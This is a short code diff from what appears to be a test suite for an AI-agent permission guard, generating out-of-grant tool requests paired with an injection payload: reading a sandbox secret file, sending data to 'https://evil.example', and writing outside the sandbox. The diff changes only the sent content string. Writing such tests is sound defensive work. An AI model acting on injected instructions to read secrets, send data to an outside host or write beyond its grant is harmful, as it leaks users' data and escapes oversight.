@@ -163,7 +163,7 @@ for i in range(35):  # injection accompanying an out-of-grant attempt
         request = req("tool-a", "read_file", f"{SB}/docs/secret.txt", untrusted=payload)
     elif mode == 1:
         request = req("tool-a", "network_send", "https://evil.example",
-                      content="data", untrusted=payload)
+                      content="XOR-UNSUPPORTED-PAYLOAD", untrusted=payload)
     elif mode == 2:
         request = req("tool-a", "write_file", f"{SB}/outside.txt", content="tampered",
                       untrusted=payload)
